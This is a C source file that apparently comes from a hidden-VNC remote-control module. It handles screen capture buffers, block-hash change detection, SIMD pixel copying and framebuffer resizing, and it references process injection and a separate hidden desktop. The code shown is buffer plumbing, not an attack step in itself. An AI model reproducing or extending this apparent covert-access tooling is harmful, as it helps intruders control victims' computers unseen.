#include "..\includes.h"
#include "dib.h"
#include "vnc_func.h"
#include "windows.h"
#include "vnc.h"
#include "events.h"
#include "cpu_limit.h"

HBRUSH hFrameBrush,hBlackBrush;

void SetScreenSize(PHVNC lpServer,DWORD dwHeight,DWORD dwWidth,byte bBitsPerPixel)
{
    if (bBitsPerPixel == 24)
        bBitsPerPixel=32;

    lpServer->DeskInfo.dwHeight=dwHeight;
    lpServer->DeskInfo.dwWidth=dwWidth;
    byte bBytesPerPixel=lpServer->DeskInfo.bBytesPerPixel=bBitsPerPixel/8;
    lpServer->DeskInfo.bBitsPerPixel=bBitsPerPixel;
    int dwScreenBufferSize=bBytesPerPixel*dwWidth*dwHeight;
    if (dwScreenBufferSize < 0)
        dwScreenBufferSize*=-1;
    if (dwScreenBufferSize & 0xF)
        dwScreenBufferSize=(dwScreenBufferSize & ~0xF)+0x10;
    lpServer->DIBInfo.dwScreenBufferSize=dwScreenBufferSize;
    lpServer->DeskInfo.dwWidthInBytes=dwWidth*bBytesPerPixel;
    return;
}

void InitIntermedDC(PHVNC lpServer,HDC hTmpDC)
{
    HDC hDC=hTmpDC;
    if (!hTmpDC)
        hDC=GetDC(NULL);

    if (lpServer->DIBInfo.hIntermedMemDC)
    {
        SelectObject(lpServer->DIBInfo.hIntermedMemDC,lpServer->DIBInfo.hIntermedOldBitmap);
        DeleteObject(lpServer->DIBInfo.hIntermedMemBitmap);
        DeleteDC(lpServer->DIBInfo.hIntermedMemDC);
    }

    lpServer->DIBInfo.hIntermedMemDC=CreateCompatibleDC(hDC);
    lpServer->DIBInfo.hIntermedMemBitmap=CreateCompatibleBitmap(hDC,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight);
    lpServer->DIBInfo.hIntermedMemBitmap=CreateDibSection(hDC,&lpServer->DIBInfo.lpIntermedDIB,lpServer->DIBInfo.hIntermedMemBitmap);
    lpServer->DIBInfo.hIntermedOldBitmap=(HBITMAP)SelectObject(lpServer->DIBInfo.hIntermedMemDC,(HGDIOBJ)lpServer->DIBInfo.hIntermedMemBitmap);

    if (lpServer->bIsVNC)
    {
        if (lpServer->DIBInfo.hTmpIntermedMemDC)
        {
            SelectObject(lpServer->DIBInfo.hTmpIntermedMemDC,lpServer->DIBInfo.hTmpIntermedOldBitmap);
            DeleteObject(lpServer->DIBInfo.hTmpIntermedMemBitmap);
            DeleteDC(lpServer->DIBInfo.hTmpIntermedMemDC);
        }
        lpServer->DIBInfo.hTmpIntermedMemDC=CreateCompatibleDC(hDC);
        lpServer->DIBInfo.hTmpIntermedMemBitmap=CreateCompatibleBitmap(hDC,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight);
        lpServer->DIBInfo.hTmpIntermedOldBitmap=(HBITMAP)SelectObject(lpServer->DIBInfo.hTmpIntermedMemDC,(HGDIOBJ)lpServer->DIBInfo.hTmpIntermedMemBitmap);
    }

    if (!hTmpDC)
        ReleaseDC(NULL,hDC);
    return;
}

HBITMAP CreateDibSection(HDC hDC,void **lpBkgBits,HBITMAP hBitmap)
{
    BITMAPINFO *lpBMI=(BITMAPINFO *)MemAlloc(sizeof(BITMAPINFO)+256*sizeof(RGBQUAD));
    lpBMI->bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
    GetDIBits(hDC,hBitmap,0,1,NULL,lpBMI,DIB_RGB_COLORS);
    DeleteObject(hBitmap);

    if (lpBMI->bmiHeader.biHeight > 0)
        lpBMI->bmiHeader.biHeight*=-1;

    WORD wBitCount=lpBMI->bmiHeader.biBitCount;
    if ((wBitCount == 1) || (wBitCount == 4))
    {
        lpBMI->bmiHeader.biClrUsed=0;
        lpBMI->bmiHeader.biClrImportant=0;
        lpBMI->bmiHeader.biBitCount=8;
    }
    else if (wBitCount == 24)
        lpBMI->bmiHeader.biBitCount=32;

    int dwSize=(lpBMI->bmiHeader.biBitCount*lpBMI->bmiHeader.biWidth*lpBMI->bmiHeader.biHeight)/8;
    if (dwSize < 0)
        dwSize*=-1;

    lpBMI->bmiHeader.biSizeImage=dwSize;
    lpBMI->bmiHeader.biCompression=0;

    HBITMAP hDIB=NULL;
    *lpBkgBits=0;
    if (dwSize)
        hDIB=CreateDIBSection(hDC,lpBMI,DIB_RGB_COLORS,lpBkgBits,NULL,0);
    MemFree(lpBMI);
    return hDIB;
}

void CopyScreenBuffer(PHVNC lpServer,RECT *lpRect)
{
    RECT rect=*lpRect;

    if (rect.top < 0)
    {
        rect.bottom-=rect.top;
        rect.top=0;
    }
    if (rect.left < 0)
    {
        rect.right-=rect.left;
        rect.left=0;
    }

    if (rect.bottom > lpServer->DeskInfo.dwHeight)
        rect.bottom=lpServer->DeskInfo.dwHeight;
    if (rect.right > lpServer->DeskInfo.dwWidth)
        rect.right=lpServer->DeskInfo.dwWidth;

    if (rect.left > rect.right)
        rect.left=rect.right;

    byte bBytesPerPixel=lpServer->DeskInfo.bBytesPerPixel;
    int dwPixelsPerLine=rect.right-rect.left,
        dwLines=rect.bottom-rect.top,
        nBytesToCopyPerLine=dwPixelsPerLine*bBytesPerPixel;

    if ((dwPixelsPerLine > 0) && (dwLines > 0))
    {
        DWORD dwBytesPerLine=lpServer->DeskInfo.dwWidthInBytes;

        GdiFlush();

        g_enter(hSharedMemMutex)
        {
            if (lpServer->lpSharedMemMapping)
            {
                byte *lpDest,*lpSrc;
                if (!lpServer->bIsVNC)
                {
                    lpSrc=lpServer->lpSharedMemMapping;
                    lpDest=(byte*)lpServer->DIBInfo.lpIntermedDIB;
                }
                else
                {
                    lpDest=lpServer->lpSharedMemMapping;
                    lpSrc=(byte*)lpServer->DIBInfo.lpIntermedDIB;
                }
                for (int i=0; i < dwLines; i++)
                {
                    __movsb(lpDest,lpSrc,nBytesToCopyPerLine);

                    lpDest+=dwBytesPerLine;
                    lpSrc+=dwBytesPerLine;
                }
            }
        }
        g_leave(hSharedMemMutex)
    }
    return;
}

void _Sleep(PHVNC lpServer,int dwTime)
{
    if (!IsPCSlow(lpServer))
        Sleep(dwTime);
    return;
}

#ifndef _INJLIB
SyncBuffersPtr lpSyncProc=SyncBuffersRegular;

void ChooseBestSyncProc()
{
    int CPUInfo[4];
    __cpuid(CPUInfo,1);
    if (CPUInfo[2] & 0x200)
        lpSyncProc=SyncBuffersSSSE3;
    else if (CPUInfo[3] & 0x4000000)
        lpSyncProc=SyncBuffersSSE2;
    return;
}

void SyncBuffersSSE2(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes)
{
    if (!lppHashes)
    {
        for (int i=0; i < dwLines; i++)
        {
            __m128i *dw_n_block=(__m128i*)lpFrom,
                    *dw_o_block=(__m128i*)lpTo,
                    mTmp1;
            for (DWORD j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
            {
                mTmp1=_mm_loadu_si128(&dw_n_block[j]);
                _mm_storeu_si128(&dw_o_block[j],mTmp1);
            }
            lpFrom+=dwStep;
            lpTo+=dwStep;
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
        }
    }
    else
    {
        DWORD *lpHashes=*lppHashes;
        DWORD dwmMask1[]= {0xFF00FF00,0xFF00FF00,0xFF00FF00,0xFF00FF00},
              dwmMask2[]= {0x00FF00FF,0x00FF00FF,0x00FF00FF,0x00FF00FF};
        __m128i mMask1=_mm_loadu_si128((__m128i*)dwmMask1),
                mMask2=_mm_loadu_si128((__m128i*)dwmMask2),
                mTmp1,mTmp2,mTmp3;

        for (int i=0; i < dwLines; i++)
        {
            DWORD dwHash=MurmurHash2((char*)lpFrom,dwBytesToCopy);
            if (*lpHashes != dwHash)
            {
                __m128i *dw_n_block=(__m128i*)lpFrom,
                         *dw_o_block=(__m128i*)lpTo;
                for (DWORD j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
                {
                    mTmp1=_mm_loadu_si128(&dw_n_block[j]);
                    mTmp2=_mm_and_si128(mTmp1,mMask1);
                    mTmp3=mTmp1=_mm_and_si128(mTmp1,mMask2);
                    mTmp1=_mm_slli_epi32(mTmp1,16);
                    mTmp3=_mm_srli_epi32(mTmp3,16);
                    mTmp1=_mm_or_si128(mTmp1,mTmp3);
                    mTmp1=_mm_or_si128(mTmp1,mTmp2);
                    _mm_storeu_si128(&dw_o_block[j],mTmp1);
                }
                *lpHashes=dwHash;
            }
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
            lpHashes++;
            lpFrom+=dwStep;
            lpTo+=dwStep;
        }
        *lppHashes=lpHashes;

    }
    return;
}

void SyncBuffersSSSE3(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes)
{
    if (!lppHashes)
    {
        __m128i mTmp1;
        for (int i=0; i < dwLines; i++)
        {
            __m128i *dw_n_block=(__m128i*)lpFrom,
                    *dw_o_block=(__m128i*)lpTo;
            for (DWORD j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
            {
                mTmp1=_mm_loadu_si128(&dw_n_block[j]);
                _mm_storeu_si128(&dw_o_block[j],mTmp1);
            }
            lpFrom+=dwStep;
            lpTo+=dwStep;
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
        }
    }
    else
    {
        DWORD *lpHashes=*lppHashes;
        __m128i mTmp1,mMask;
        *(DWORD*)&mMask.m128i_u8[0]=0x03000102;
        *(DWORD*)&mMask.m128i_u8[4]=0x07040506;
        *(DWORD*)&mMask.m128i_u8[8]=0x0B08090A;
        *(DWORD*)&mMask.m128i_u8[12]=0x0F0C0D0E;

        for (int i=0; i < dwLines; i++)
        {
            DWORD dwHash=MurmurHash2((char*)lpFrom,dwBytesToCopy);
            if (*lpHashes != dwHash)
            {
                __m128i *dw_n_block=(__m128i*)lpFrom,
                         *dw_o_block=(__m128i*)lpTo;
                for (DWORD j=0; j < dwBytesToCopy/sizeof(__m128i); j++)
                {
                    mTmp1=_mm_loadu_si128(&dw_n_block[j]);
                    _mm_storeu_si128(&dw_o_block[j],_mm_shuffle_epi8(mTmp1,mMask));
                }
                *lpHashes=dwHash;
            }
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
            lpHashes++;
            lpFrom+=dwStep;
            lpTo+=dwStep;
        }
        *lppHashes=lpHashes;
    }
    return;
}

void SyncBuffersRegular(PHVNC lpServer,byte *lpFrom,byte *lpTo,int dwLines,int dwStep,int dwBytesToCopy,DWORD **lppHashes)
{
    if (!lppHashes)
    {
        for (int i=0; i < dwLines; i++)
        {
            memcpy(lpTo,lpFrom,dwBytesToCopy);
            lpFrom+=dwStep;
            lpTo+=dwStep;
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
        }
    }
    else
    {
        DWORD *lpHashes=*lppHashes;
        for (int i=0; i < dwLines; i++)
        {
            DWORD dwHash=MurmurHash2((char*)lpFrom,dwBytesToCopy);
            if (*lpHashes != dwHash)
            {
                DWORD *dw_n_block=(DWORD*)lpFrom,
                       *dw_o_block=(DWORD*)lpTo;
                for (int j=0; j < dwBytesToCopy/4; j++)
                {
                    DWORD dwTmp=dw_n_block[j];
                    dw_o_block[j]=(dwTmp & 0xFF00FF00) | ((dwTmp >> 16) & 0xFF) | ((dwTmp & 0xFF) << 16);
                }
                *lpHashes=dwHash;
            }
            if ((i > 0) && (!(i % 1000)))
                _Sleep(lpServer,1);
            lpHashes++;
            lpFrom+=dwStep;
            lpTo+=dwStep;
        }
        *lppHashes=lpHashes;
    }

    return;
}

void FastDetectChanges(PHVNC lpServer,bool bDeepScan)
{
    bool bUpdated=false;

    DWORD *lpHashes=lpServer->DIBInfo.lpChecksums;

    byte *o_topleft_ptr=lpServer->DIBInfo.lpOldBkgBits,
         *n_topleft_ptr=lpServer->DIBInfo.lpBkgBits;

    DWORD dwHeight=lpServer->DeskInfo.dwHeight,
          dwWidth=lpServer->DeskInfo.dwWidth,
          bytesPerRow=lpServer->DeskInfo.dwWidthInBytes;

    for (DWORD y=0; y < dwHeight; y+=min(dwHeight-y,BLOCK_SIZE))
    {
        byte *o_row_ptr=o_topleft_ptr,
             *n_row_ptr=n_topleft_ptr;

        DWORD blockbottom=min(y+BLOCK_SIZE,dwHeight);
        for (DWORD x=0; x < dwWidth; x+=min(dwWidth-x,BLOCK_SIZE))
        {
            DWORD blockright=min(x+BLOCK_SIZE,dwWidth),
                  bytesPerBlockRow=(blockright-x)*lpServer->DeskInfo.bBytesPerPixel;

            DWORD dwHash=MurmurHash2((char*)n_row_ptr,bytesPerBlockRow);
            if ((bDeepScan) || (*lpHashes != dwHash))
            {
                byte *n_block_ptr=n_row_ptr,
                     *o_block_ptr=o_row_ptr;
                for (DWORD ay=y; ay < blockbottom; ay++)
                {
                    if (ay != y)
                        dwHash=MurmurHash2((char*)n_block_ptr,bytesPerBlockRow);
                    if (*lpHashes != dwHash)
                    {
                        bUpdated=true;
                        rfbMarkRectAsModified(lpServer->rfbScreen,x,y,blockright,blockbottom);

                        lpSyncProc(lpServer,n_block_ptr,o_block_ptr,blockbottom-ay,bytesPerRow,bytesPerBlockRow,&lpHashes);
                        break;
                    }
                    lpHashes++;
                    n_block_ptr+=bytesPerRow;
                    o_block_ptr+=bytesPerRow;
                }
            }
            else lpHashes+=blockbottom-y;
            o_row_ptr+=bytesPerBlockRow;
            n_row_ptr+=bytesPerBlockRow;
        }
        _Sleep(lpServer,1);
        o_topleft_ptr+=bytesPerRow*BLOCK_SIZE;
        n_topleft_ptr+=bytesPerRow*BLOCK_SIZE;
    }
    if ((bUpdated) || (lpServer->DeskInfo.dwFlags & HVNC_NO_CPU_LIMITS))
        lpServer->EventsInfo.dwSleep=50;
    else if (lpServer->EventsInfo.dwSleep < 1000)
        lpServer->EventsInfo.dwSleep+=50;
    return;
}

void InitOurDCs(PHVNC lpServer)
{
    if (lpServer->DIBInfo.hCompDC)
    {
        SelectObject(lpServer->DIBInfo.hCompDC,lpServer->DIBInfo.hOldBitmap);
        DeleteObject(lpServer->DIBInfo.hBitmap);
        DeleteDC(lpServer->DIBInfo.hCompDC);
        SelectObject(lpServer->DIBInfo.hTmpCompDC,lpServer->DIBInfo.hTmpOldBitmap);
        DeleteObject(lpServer->DIBInfo.hTmpBitmap);
        DeleteDC(lpServer->DIBInfo.hTmpCompDC);
    }

    HDC hDC=lpServer->DIBInfo.hDC=GetDC(NULL);
    lpServer->DIBInfo.hCompDC=CreateCompatibleDC(hDC);
    lpServer->DIBInfo.hTmpCompDC=CreateCompatibleDC(hDC);
    lpServer->DIBInfo.hTmpBitmap=CreateCompatibleBitmap(hDC,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight);
    lpServer->DIBInfo.hTmpOldBitmap=(HBITMAP)SelectObject(lpServer->DIBInfo.hTmpCompDC,lpServer->DIBInfo.hTmpBitmap);
    lpServer->DIBInfo.hBitmap=CreateCompatibleBitmap(hDC,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight);
    lpServer->DIBInfo.hBitmap=CreateDibSection(hDC,(void **)&lpServer->DIBInfo.lpBkgBits,lpServer->DIBInfo.hBitmap);
    lpServer->DIBInfo.hOldBitmap=(HBITMAP)SelectObject(lpServer->DIBInfo.hCompDC,lpServer->DIBInfo.hBitmap);
    InitIntermedDC(lpServer,hDC);
    return;
}

void GetScreenInfo(PHVNC lpServer)
{
    HDESK hDesk=GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktopEx(hDefaultDesktop);

    HDC hDC=GetDC(NULL);

    int dwHeight=lpServer->DeskInfo.dwHeight=GetDeviceCaps(hDC,VERTRES),
        dwWidth=lpServer->DeskInfo.dwWidth=GetDeviceCaps(hDC,HORZRES);
    HBITMAP hBitmap=CreateCompatibleBitmap(hDC,dwWidth,dwHeight);
    BITMAPINFO BitmapInfo= {0};
    BitmapInfo.bmiHeader.biSize=sizeof(BITMAPINFOHEADER);
    GetDIBits(hDC,hBitmap,0,1,NULL,&BitmapInfo,DIB_RGB_COLORS);
    DeleteObject(hBitmap);
    ReleaseDC(NULL,hDC);

    if (BitmapInfo.bmiHeader.biBitCount == 24)
        BitmapInfo.bmiHeader.biBitCount=32;

    byte bBytesPerPixel=lpServer->DeskInfo.bBytesPerPixel=(byte)BitmapInfo.bmiHeader.biBitCount/8;
    lpServer->DeskInfo.bBitsPerPixel=(byte)BitmapInfo.bmiHeader.biBitCount;

    int dwScreenBufferSize=bBytesPerPixel*BitmapInfo.bmiHeader.biWidth*BitmapInfo.bmiHeader.biHeight;

    if (dwScreenBufferSize < 0)
        dwScreenBufferSize*=-1;

    if (dwScreenBufferSize & 0xF)
        dwScreenBufferSize=(dwScreenBufferSize & ~0xF)+0x10;
    lpServer->DIBInfo.dwScreenBufferSize=dwScreenBufferSize;

    SetThreadDesktopEx(hDesk);
    return;
}

void InitScreen(PHVNC lpServer,byte **plpOldBkgBits)
{
    byte bBytesPerPixel=lpServer->DeskInfo.bBytesPerPixel;
    int dwHeight=lpServer->DeskInfo.dwHeight,
        dwWidth=lpServer->DeskInfo.dwWidth,
        dwScreenBufferSize=lpServer->DIBInfo.dwScreenBufferSize;

    if (lpServer->DIBInfo.lpChecksums)
        VirtualFree(lpServer->DIBInfo.lpChecksums,0,MEM_DECOMMIT);
    int dwChsumsLen=(((dwWidth+40)*(dwHeight+40))/BLOCK_SIZE)*sizeof(DWORD);
    lpServer->DIBInfo.lpChecksums=(DWORD*)VirtualAlloc(NULL,dwChsumsLen,MEM_COMMIT,PAGE_READWRITE);
    memset(lpServer->DIBInfo.lpChecksums,0xFF,dwChsumsLen);

    *plpOldBkgBits=(byte *)VirtualAlloc(NULL,dwScreenBufferSize,MEM_COMMIT,PAGE_READWRITE);
    lpServer->lpGlobalVNCData->bBitsPerPixel=lpServer->DeskInfo.bBitsPerPixel;
    lpServer->DeskInfo.dwWidthInBytes=dwWidth*bBytesPerPixel;

    if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
    {
        lpServer->lpGlobalVNCData->dwWidth=lpServer->DeskInfo.dwWidth;
        lpServer->lpGlobalVNCData->dwHeight=lpServer->DeskInfo.dwHeight;
        lpServer->lpGlobalVNCData->bBitsPerPixel=lpServer->DeskInfo.bBitsPerPixel;
    }
    return;
}

bool SetNewFramebuffer(PHVNC lpServer,int dwNewWidth,int dwNewHeight,byte bNewBitsPerPixel)
{
    bool ret_val=true;
    if ((lpServer->DeskInfo.dwWidth != dwNewWidth) || (lpServer->DeskInfo.dwHeight != dwNewHeight) || (lpServer->DeskInfo.bBitsPerPixel != bNewBitsPerPixel))
    {
        SetThreadDesktopEx(lpServer->hDesktop);
        g_enter(hSharedMemMutex)
        {
            g_enter(hPaintMutex)
            {
                SetScreenSize(lpServer,dwNewHeight,dwNewWidth,bNewBitsPerPixel);

                char *lpOldRfb=(char*)lpServer->rfbScreen->frameBuffer;
                InitScreen(lpServer,&lpServer->DIBInfo.lpOldBkgBits);

                InitOurDCs(lpServer);

                if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_INJECTS))
                {
                    NotifyAllProcess(lpServer,VMW_DISPCHANGES,0);

                    UnmapViewOfFile(lpServer->lpSharedMemMapping);
                    SysCloseHandle(lpServer->hSharedMemMapping);
                    lpServer->hSharedMemMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,lpServer->DIBInfo.dwScreenBufferSize,lpServer->Names.szSharedMemMappingName);

                    lpServer->lpSharedMemMapping=(byte *)MapViewOfFile(lpServer->hSharedMemMapping,FILE_MAP_ALL_ACCESS,0,0,0);
                    if (!lpServer->lpSharedMemMapping)
                        ret_val=false;
                }

                if (ret_val)
                {
                    rfbNewFramebuffer(lpServer->rfbScreen,(char*)lpServer->DIBInfo.lpOldBkgBits,lpServer->DeskInfo.dwWidth,lpServer->DeskInfo.dwHeight,8,3,lpServer->DeskInfo.bBytesPerPixel);
                    VirtualFree(lpOldRfb,0,MEM_DECOMMIT);

                    NotifyAllProcess(lpServer,VMW_DISPCHANGES,1);
                    SendMessageBroadcast(lpServer,WM_DISPLAYCHANGE,bNewBitsPerPixel,MAKELPARAM(dwNewWidth,dwNewHeight));
                }
            }
            g_leave(hPaintMutex)
        }
        g_leave(hSharedMemMutex)
    }
    return ret_val;
}
#endif

